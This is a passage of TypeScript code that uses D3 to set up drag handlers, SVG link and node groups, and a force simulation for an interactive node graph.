    event: d3.D3DragEvent<SVGCircleElement, Node, Node>,
    d: Node,
  ) => {
    d.fx = event.x;
    d.fy = event.y;
  };

  const dragEnded = (
    event: d3.D3DragEvent<SVGCircleElement, Node, Node>,
    d: Node,
  ) => {
    if (!event.active) simulation.alphaTarget(0);
    d.fx = null;
    d.fy = null;
  };

  return d3
    .drag<SVGCircleElement, Node>()
    .on("start", dragStarted)
    .on("drag", dragged)
    .on("end", dragEnded);
};

const prepareGroups = (svg: SVGElement) => {
  if (d3.select(svg).select("g.links").empty()) {
    d3.select(svg).append("g").attr("class", "links");
  }

  if (d3.select(svg).select("g.nodes").empty()) {
    d3.select(svg).append("g").attr("class", "nodes");
  }
};

const createSimulation = (width: number, height: number) => {
  return d3
    .forceSimulation<Node, Link>()
    .force("link", d3.forceLink<Node, Link>().id(getNodeId).distance(110))
    .force("charge", d3.forceManyBody())
    .force("center", d3.forceCenter(width / 2, height / 2))
    .force(
      "collide",
      d3
        .forceCollide<Node>()
        .radius((d) => (d.isMain ? 20 : 15))
        .iterations(2),
    );
};